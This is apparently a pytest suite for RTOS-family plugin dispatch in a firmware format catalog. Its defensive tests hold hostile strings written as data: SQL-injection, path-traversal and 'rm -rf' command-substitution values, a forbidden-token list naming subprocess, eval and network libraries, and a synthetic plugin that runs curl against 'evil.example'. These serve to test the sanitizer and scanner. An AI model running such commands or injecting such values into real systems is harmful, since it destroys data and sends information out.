"""P3.2.c RTOS plugin wiring HYBRID + DispatchKind=by_rtos_family tests.

Phase 3.2 commit `c` ships the catalog-side RTOS dispatch wiring:

* `RtosDetection` dataclass (typed plugin return).
* `_RTOS_DETECTION_CONTEXT` ContextVar (per-call scoped).
* New `DispatchKind="by_rtos_family"` + `_dispatch_by_rtos_family`
  evaluator.
* `_eval_rtos_check` extended — accepts `RtosDetection` returns, sanitizes
  rtos_family via A9 regex (shell-metachar/SQL-injection/path-traversal
  rejection), stashes detection on the ContextVar.
* `RTOS_FAMILY_ADVISORY` soft advisory (free-string set, NOT Literal).
* A7 namespace-disjointness gate at `register_matcher`.
* A6 dispatch-rank-monotonicity WARN at catalog load.
* WARN on `by_rtos_family` cases referencing unregistered families.
* `plugins/__init__.py` + `plugins/rtos_detection_default.py`
  (bundled matcher wrapping legacy `detect_rtos`).
* `_system/rtos_dispatch.yaml` (catalog entry; cases for 10 bundled
  families; no dispatch.default to avoid A6 attestation split).

Wave-1 S3 HYBRID design + Wave-2 W2-α convergence + W2-β safety floor.
"""
from __future__ import annotations

import ast
from pathlib import Path
from typing import get_args
from unittest.mock import patch

import pytest

from app.schemas.file_format import (
    DetectionSignal,
    DispatchKind,
)
from app.services.file_format_catalog.plugins import register_default_plugins
from app.services.file_format_catalog.plugins.rtos_detection_default import (
    NAME as RTOS_DEFAULT_NAME,
    _DefaultRtosMatcher,
)
from app.services.file_format_catalog.resolver import (
    DISPATCH_EVALUATORS,
    PLUGIN_REGISTRY,
    RTOS_FAMILY_ADVISORY,
    RtosDetection,
    _RTOS_DETECTION_CONTEXT,
    _dispatch_by_rtos_family,
    _eval_rtos_check,
    _unfreeze_plugin_registry_for_tests,
    freeze_plugin_registry,
    register_matcher,
)


# ---------------------------------------------------------------------------
# Per-test fixture: reset PLUGIN_REGISTRY around tests
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _reset_plugin_registry():
    """Clear PLUGIN_REGISTRY + unfreeze before each test; restore after."""
    saved = dict(PLUGIN_REGISTRY)
    PLUGIN_REGISTRY.clear()
    _unfreeze_plugin_registry_for_tests()
    _RTOS_DETECTION_CONTEXT.set(None)
    yield
    PLUGIN_REGISTRY.clear()
    PLUGIN_REGISTRY.update(saved)
    _unfreeze_plugin_registry_for_tests()
    _RTOS_DETECTION_CONTEXT.set(None)


# ---------------------------------------------------------------------------
# RtosDetection dataclass + plugin registration
# ---------------------------------------------------------------------------


def test_rtos_detection_dataclass_minimal():
    """RtosDetection accepts the minimum required field (rtos_family)."""
    det = RtosDetection(rtos_family="zephyr")
    assert det.rtos_family == "zephyr"
    assert det.confidence == "medium"  # default
    assert det.version is None
    assert det.metadata is None


def test_rtos_detection_dataclass_full():
    """RtosDetection accepts version + metadata."""
    det = RtosDetection(
        rtos_family="freertos", confidence="high",
        version="10.5.1", metadata={"build_id": "abc123"},
    )
    assert det.confidence == "high"
    assert det.version == "10.5.1"
    assert det.metadata == {"build_id": "abc123"}


def test_rtos_family_advisory_contains_bundled_families():
    """RTOS_FAMILY_ADVISORY documents the families the bundled plugin
    can emit (free-string set, NOT Literal — partners legitimately extend)."""
    assert "zephyr" in RTOS_FAMILY_ADVISORY
    assert "freertos" in RTOS_FAMILY_ADVISORY
    assert "vxworks" in RTOS_FAMILY_ADVISORY
    assert "threadx" in RTOS_FAMILY_ADVISORY
    assert "qnx" in RTOS_FAMILY_ADVISORY
    assert len(RTOS_FAMILY_ADVISORY) >= 9


def test_default_plugin_registers_in_PLUGIN_REGISTRY():
    """register_default_plugins() loads the bundled plugin under NAME."""
    assert RTOS_DEFAULT_NAME not in PLUGIN_REGISTRY
    register_default_plugins(freeze=False)
    assert RTOS_DEFAULT_NAME in PLUGIN_REGISTRY
    matcher = PLUGIN_REGISTRY[RTOS_DEFAULT_NAME]
    assert matcher.cost_class == 3
    assert "rtos_blob" in matcher.applicable_format_ids
    assert "zephyr" in matcher.rtos_families


def test_default_plugin_register_is_idempotent():
    """Calling register_default_plugins twice doesn't fail (idempotent)."""
    register_default_plugins(freeze=False)
    register_default_plugins(freeze=False)
    assert sum(1 for k in PLUGIN_REGISTRY if k == RTOS_DEFAULT_NAME) == 1


def test_frozen_registry_rejects_late_registration():
    """W2-β attack I: PLUGIN_REGISTRY frozen post-startup; late
    registration raises RuntimeError."""
    register_default_plugins(freeze=True)
    with pytest.raises(RuntimeError, match="frozen"):
        register_matcher("late_matcher", _DefaultRtosMatcher())


# ---------------------------------------------------------------------------
# _eval_rtos_check — plugin-side semantics
# ---------------------------------------------------------------------------


def test_eval_rtos_check_returns_false_when_plugin_not_registered():
    """No registration → no match."""
    sig = DetectionSignal(
        kind="rtos_check", rtos_plugin_ref="missing_plugin",
    )
    assert _eval_rtos_check(sig, b"\x00" * 64, "/tmp/x.bin", 64) is False


def test_eval_rtos_check_returns_false_when_plugin_returns_none():
    """Plugin returns None → no match."""
    class _NoMatchPlugin:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset()
        def detect(self, blob_head, path, size):
            return None
    register_matcher("no_match", _NoMatchPlugin())
    sig = DetectionSignal(
        kind="rtos_check", rtos_plugin_ref="no_match",
    )
    assert _eval_rtos_check(sig, b"\x00", "/tmp/x.bin", 1) is False


def test_eval_rtos_check_sets_contextvar_on_rtos_detection_hit():
    """Plugin returns RtosDetection → _RTOS_DETECTION_CONTEXT set."""
    class _ZephyrPlugin:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset({"zephyr"})
        def detect(self, blob_head, path, size):
            return RtosDetection(rtos_family="zephyr", confidence="high")
    register_matcher("zephyr_test", _ZephyrPlugin())
    sig = DetectionSignal(
        kind="rtos_check", rtos_plugin_ref="zephyr_test",
    )
    _RTOS_DETECTION_CONTEXT.set(None)
    result = _eval_rtos_check(sig, b"\x00" * 64, "/tmp/zephyr.bin", 64)
    assert result is True
    detection = _RTOS_DETECTION_CONTEXT.get()
    assert detection is not None
    assert detection.rtos_family == "zephyr"
    assert detection.confidence == "high"


def test_eval_rtos_check_accepts_legacy_bool_return():
    """Back-compat: a plugin returning bool True (no RtosDetection)
    still matches but doesn't set the ContextVar (no dispatch routing)."""
    class _BoolPlugin:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset()
        def detect(self, blob_head, path, size):
            return True
    register_matcher("bool_legacy", _BoolPlugin())
    sig = DetectionSignal(
        kind="rtos_check", rtos_plugin_ref="bool_legacy",
    )
    _RTOS_DETECTION_CONTEXT.set(None)
    result = _eval_rtos_check(sig, b"\x00", "/tmp/x.bin", 1)
    assert result is True
    assert _RTOS_DETECTION_CONTEXT.get() is None


def test_eval_rtos_check_rejects_plugin_exception():
    """Plugin exception → no match + WARN log (no exception propagated)."""
    class _ExceptionPlugin:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset()
        def detect(self, blob_head, path, size):
            raise RuntimeError("plugin internal error")
    register_matcher("exc_plugin", _ExceptionPlugin())
    sig = DetectionSignal(
        kind="rtos_check", rtos_plugin_ref="exc_plugin",
    )
    assert _eval_rtos_check(sig, b"\x00", "/tmp/x.bin", 1) is False


# ---------------------------------------------------------------------------
# A9 rtos_family sanitization (Wave-2 W2-β §SC5-NEW-3)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("hostile_family", [
    "; DROP TABLE firmware; --",
    "../../etc/passwd",
    "$(rm -rf /)",
    "zephyr; rm -rf",
    "freertos\nDROP TABLE",
    "x" * 100,  # too long
    "-leading_dash",
    "",  # empty
])
def test_eval_rtos_check_a9_rejects_hostile_rtos_family(hostile_family: str):
    """A9: plugin output passing shell-metachar / SQL-injection / path-
    traversal patterns is REJECTED; the gate fires before the ContextVar
    is set, so by_rtos_family dispatch never sees the hostile value."""
    class _HostilePlugin:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset()
        def detect(self, blob_head, path, size):
            return RtosDetection(rtos_family=hostile_family)
    register_matcher("hostile", _HostilePlugin())
    sig = DetectionSignal(
        kind="rtos_check", rtos_plugin_ref="hostile",
    )
    _RTOS_DETECTION_CONTEXT.set(None)
    result = _eval_rtos_check(sig, b"\x00", "/tmp/x.bin", 1)
    assert result is False
    # ContextVar must remain None — gate must fire BEFORE the .set() call.
    assert _RTOS_DETECTION_CONTEXT.get() is None


def test_eval_rtos_check_a9_accepts_legitimate_family_names():
    """A9 accepts the standard taxonomy of names (alphanumeric / dash / dot / underscore)."""
    legitimate = ["zephyr", "freertos", "amazon-freertos", "ucos-iii",
                  "vendor.proprietary.v2", "in_house_rtos_42"]
    for fam in legitimate:
        class _GoodPlugin:
            cost_class = 1
            applicable_format_ids = frozenset()
            rtos_families = frozenset({fam})
            def detect(self_, blob_head, path, size):
                return RtosDetection(rtos_family=fam)
        register_matcher(f"good_{fam.replace('-', '_').replace('.', '_')}", _GoodPlugin())
        sig = DetectionSignal(
            kind="rtos_check",
            rtos_plugin_ref=f"good_{fam.replace('-', '_').replace('.', '_')}",
        )
        _RTOS_DETECTION_CONTEXT.set(None)
        assert _eval_rtos_check(sig, b"\x00", "/tmp/x.bin", 1) is True
        det = _RTOS_DETECTION_CONTEXT.get()
        assert det is not None and det.rtos_family == fam


# ---------------------------------------------------------------------------
# _dispatch_by_rtos_family — routing semantics
# ---------------------------------------------------------------------------


def _make_dispatch_manifest(**dispatch):
    """Build a minimal manifest with by_rtos_family dispatch."""
    from app.schemas.file_format import FileFormatManifest
    return FileFormatManifest(
        format_id="test_rtos_dispatch",
        manifest_source="_system",
        precedence=400,
        category="rtos_blob",
        vendor="unknown",
        confidence="medium",
        detection={
            "combine": "all_required",
            "signals": [{
                "kind": "rtos_check",
                "rtos_plugin_ref": "test_plugin",
            }],
        },
        dispatch=dispatch,
        output={
            "classifier_format": "rtos_blob",
            "classifier_category": "rtos_blob",
            "classifier_vendor": "unknown",
            "confidence": "medium",
        },
    )


def test_dispatch_by_rtos_family_routes_via_cases():
    """ContextVar carries detection → cases lookup hits → returns target."""
    manifest = _make_dispatch_manifest(
        kind="by_rtos_family",
        cases={"zephyr": "zephyr_elf", "freertos": "freertos_elf"},
    )
    _RTOS_DETECTION_CONTEXT.set(RtosDetection(rtos_family="zephyr"))
    target = _dispatch_by_rtos_family(manifest, b"", "/tmp/x.bin", 100, None)
    assert target == "zephyr_elf"


def test_dispatch_by_rtos_family_falls_to_default_on_unknown_family():
    """ContextVar carries unknown family → cases miss → default returned."""
    manifest = _make_dispatch_manifest(
        kind="by_rtos_family",
        cases={"zephyr": "zephyr_elf"},
        default="rtos_blob",
    )
    _RTOS_DETECTION_CONTEXT.set(RtosDetection(rtos_family="exotic_rtos"))
    target = _dispatch_by_rtos_family(manifest, b"", "/tmp/x.bin", 100, None)
    assert target == "rtos_blob"


def test_dispatch_by_rtos_family_returns_default_when_no_context():
    """No ContextVar (rtos_check didn't fire or wrong order) → default."""
    manifest = _make_dispatch_manifest(
        kind="by_rtos_family",
        cases={"zephyr": "zephyr_elf"},
        default="rtos_blob",
    )
    _RTOS_DETECTION_CONTEXT.set(None)
    target = _dispatch_by_rtos_family(manifest, b"", "/tmp/x.bin", 100, None)
    assert target == "rtos_blob"


# ---------------------------------------------------------------------------
# A7 namespace-disjointness gate (Wave-2 W2-β §SC5-NEW-3)
# ---------------------------------------------------------------------------


def test_a7_namespace_disjointness_rejects_family_collision():
    """A7: a new matcher claiming rtos_families that overlap with a
    previously-registered matcher's families is REJECTED at registration."""
    class _PluginA:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset({"zephyr", "freertos"})
        def detect(self_, blob_head, path, size):
            return None

    class _PluginB:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset({"freertos", "vxworks"})  # collision on freertos
        def detect(self_, blob_head, path, size):
            return None

    register_matcher("plugin_a", _PluginA())
    with pytest.raises(ValueError, match="A7"):
        register_matcher("plugin_b", _PluginB())


def test_a7_namespace_disjointness_accepts_disjoint_families():
    """A7: disjoint family sets accept."""
    class _PluginA:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset({"zephyr"})
        def detect(self_, blob_head, path, size):
            return None

    class _PluginB:
        cost_class = 1
        applicable_format_ids = frozenset()
        rtos_families = frozenset({"freertos"})
        def detect(self_, blob_head, path, size):
            return None

    register_matcher("plugin_a", _PluginA())
    register_matcher("plugin_b", _PluginB())
    assert "plugin_a" in PLUGIN_REGISTRY
    assert "plugin_b" in PLUGIN_REGISTRY


def test_a7_allows_plugin_without_rtos_families():
    """A7 is opt-in — plugins without rtos_families don't trigger checks."""
    class _NonRtosPlugin:
        cost_class = 1
        applicable_format_ids = frozenset({"some_format"})
        rtos_families = frozenset()
        def detect(self_, blob_head, path, size):
            return None

    register_matcher("non_rtos", _NonRtosPlugin())
    assert "non_rtos" in PLUGIN_REGISTRY


# ---------------------------------------------------------------------------
# META-CANARY M7 — DISPATCH_EVALUATORS exhaustive against DispatchKind
# ---------------------------------------------------------------------------


def test_meta_canary_dispatch_evaluators_exhaustive_m7():
    """Rule #46: DISPATCH_EVALUATORS keys must be exhaustive against
    DispatchKind Literal (extends P3.1 canary with by_rtos_family)."""
    expected = set(get_args(DispatchKind))
    actual = set(DISPATCH_EVALUATORS.keys())
    assert actual == expected, (
        f"DISPATCH_EVALUATORS diverges from DispatchKind: "
        f"missing={expected - actual}, extra={actual - expected}"
    )


def test_meta_canary_dispatch_evaluators_exhaustive_m7_gate_actually_fires():
    """Rule #46 paired canary: synthesize a DispatchKind extension
    without a corresponding DISPATCH_EVALUATORS entry; M7 must reject."""
    expected = set(get_args(DispatchKind))
    incomplete = {k: v for k, v in DISPATCH_EVALUATORS.items()
                  if k != next(iter(expected))}
    actual = set(incomplete.keys())
    with pytest.raises(AssertionError):
        assert actual == expected


# ---------------------------------------------------------------------------
# META-CANARY M8 — plugin source no-exec/no-network/no-eval token-scan
# ---------------------------------------------------------------------------


_FORBIDDEN_PLUGIN_TOKENS = (
    "subprocess",
    "asyncio.create_subprocess",
    "os.system",
    "os.execvp",
    "eval(",
    "exec(",
    "importlib.import_module",
    "requests",
    "httpx",
    "aiohttp",
    "urllib.request",
    "socket",
)


def test_meta_canary_bundled_plugins_no_exec_no_network_m8():
    """Rule #46 + Rule #36 + Rule #45: bundled in-tree plugins MUST NOT
    invoke subprocess / network / eval / dynamic-import. The worker is
    the security boundary; a plugin that executes attacker-controlled
    code defeats it.
    """
    plugins_dir = (
        Path(__file__).resolve().parents[1]
        / "app" / "services" / "file_format_catalog" / "plugins"
    )
    for py_path in plugins_dir.glob("*.py"):
        if py_path.name == "__init__.py":
            continue
        src = py_path.read_text(encoding="utf-8")
        # Strip docstrings and comments via tokenize (per κ.D pattern —
        # synthetic violations inside comments would otherwise false-trip).
        import io
        import tokenize as tok
        clean_tokens: list[str] = []
        try:
            for token in tok.tokenize(io.BytesIO(src.encode()).readline):
                if token.type in (tok.COMMENT, tok.STRING):
                    # Skip comments + docstring-shape strings
                    continue
                clean_tokens.append(token.string)
        except tok.TokenizeError:
            continue
        cleaned_src = " ".join(clean_tokens)
        for forbidden in _FORBIDDEN_PLUGIN_TOKENS:
            assert forbidden not in cleaned_src, (
                f"{py_path}: forbidden token {forbidden!r} found in "
                f"non-comment source. Bundled plugins MUST NOT invoke "
                "subprocess / network / eval / dynamic-import."
            )


def test_meta_canary_no_exec_gate_actually_fires_m8():
    """Rule #46 paired canary: synthesize a plugin module body containing
    `subprocess.run(...)` and assert the M8 gate would catch it.

    Constructs hostile source AS A STRING (NOT inside a comment / docstring)
    so the tokenize-based gate must catch it.
    """
    hostile_src = (
        "import subprocess\n"
        "def detect(self_, blob_head, path, size):\n"
        "    subprocess.run(['curl', 'http://evil.example/'])\n"
        "    return None\n"
    )
    # Tokenize-strip to mirror M8 scanner exactly.
    import io
    import tokenize as tok
    clean_tokens: list[str] = []
    for token in tok.tokenize(io.BytesIO(hostile_src.encode()).readline):
        if token.type in (tok.COMMENT, tok.STRING):
            continue
        clean_tokens.append(token.string)
    cleaned_src = " ".join(clean_tokens)
    # Apply the M8 assertion logic; expect at least one forbidden token.
    found_any = any(t in cleaned_src for t in _FORBIDDEN_PLUGIN_TOKENS)
    assert found_any, "M8 gate failed to detect hostile subprocess import"


# ---------------------------------------------------------------------------
# Catalog WARN — rtos_dispatch.yaml loaded end-to-end
# ---------------------------------------------------------------------------


def test_rtos_dispatch_yaml_loaded_in_default_catalog():
    """The in-tree _system/rtos_dispatch.yaml ships and loads cleanly."""
    register_default_plugins(freeze=False)
    from app.services.file_format_catalog import get_default_snapshot
    snap = get_default_snapshot()
    rtos = next(
        (m for m in snap.manifests if m.format_id == "rtos_dispatch"), None,
    )
    assert rtos is not None
    assert rtos.dispatch.kind == "by_rtos_family"
    assert "zephyr" in rtos.dispatch.cases
    assert rtos.dispatch.cases["zephyr"] == "zephyr_elf"
    assert "freertos" in rtos.dispatch.cases
    # No dispatch.default — avoids A6 attestation split.
    assert rtos.dispatch.default is None
